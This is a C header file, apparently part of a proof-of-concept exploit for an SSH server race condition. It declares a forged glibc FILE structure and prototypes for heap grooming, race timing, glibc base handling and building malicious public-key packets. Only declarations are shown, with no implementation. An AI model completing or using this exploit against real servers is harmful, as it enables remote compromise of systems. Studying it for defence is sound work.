#include <stdint.h>
#include <stddef.h>

#define MAX_PACKET_SIZE (256 * 1024)
#define LOGIN_GRACE_TIME 120
#define MAX_STARTUPS 100
#define CHUNK_ALIGN(s) (((s) + 15) & ~15)

struct fake_file {
    void *_IO_read_ptr;
    void *_IO_read_end;
    void *_IO_read_base;
    void *_IO_write_base;
    void *_IO_write_ptr;
    void *_IO_write_end;
    void *_IO_buf_base;
    void *_IO_buf_end;
    void *_IO_save_base;
    void *_IO_backup_base;
    void *_IO_save_end;
    void *_markers;
    void *_chain;
    int _fileno;
    int _flags;
    int _mode;
    char _unused2[40];
    void *_vtable_offset;
};

int setup_connection(const char *ip, int port);
void send_packet(
    int sock,
    unsigned char packet_type,
    const unsigned char *data,
    size_t len
);
void prepare_heap(int sock);
void time_final_packet(int sock, double *parsing_time);
int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base, unsigned char[]);
double measure_response_time(int sock, int error_type);
void create_public_key_packet(unsigned char *packet, size_t size, uint64_t glibc_base, unsigned char[]);
void create_fake_file_structure(unsigned char *data, size_t size, uint64_t glibc_base);
void send_ssh_version(int sock);
int receive_ssh_version(int sock);
void send_kex_init(int sock);
int receive_kex_init(int sock);
int perform_ssh_handshake(int sock);
